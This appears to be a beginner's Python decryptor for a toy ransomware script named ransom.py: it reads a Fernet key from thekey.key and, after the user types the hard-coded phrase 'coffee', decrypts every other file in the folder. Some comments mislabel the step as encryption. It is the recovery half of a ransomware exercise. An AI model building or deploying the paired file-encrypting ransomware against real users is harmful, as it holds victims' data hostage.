#!/usr/bin/env python3

# decrypt the files from ransom.py


#imports the OS module  to allow for file manipulation, such as reading and writing files 
import os

# Imports the 'Fernet' class from the 'cryptography.fernet' module in the 'cryptography' library for Python.
# This class is used to implement encryption and decryption functionalities in Python applicatoions.
from cryptography.fernet import Fernet

# initializes an empty list called 'files' (to stora all the files in the current dir)
files = []

# iterate through each file in the current directory using a loop
for file in os.listdir():
    # if the files is 'ransom.py' or 'thekey.key', skip it and continue the next iteration
    if file == 'ransom.py' or file == "thekey.key" or file == "decrypt.py":
        continue
    # if the file is regular file, add it to the 'files list'.
    if os.path.isfile(file):
        files.append(file)
        
# Print the list of files to the console
print(files)

# open the key as secret key
with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("enter the secret phrase to decrypt your files")

if (user_phrase == secretphrase):
# iterate through each file in the 'files' list
    for file in files:
# open the file in read binary mode and read its     content
        with open(file, "rb") as thefile:
            contents = thefile.read()
        
            # encrypt the contents using the enryption key and the 'Fernet.encrypt()' method
        contents_decrypted =  Fernet(secretkey).decrypt(contents)
        
        # open the file in write binary mode and save the encrypted version of its contents
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("congrats your files are decrypted")
else: 
    print("that aint it")
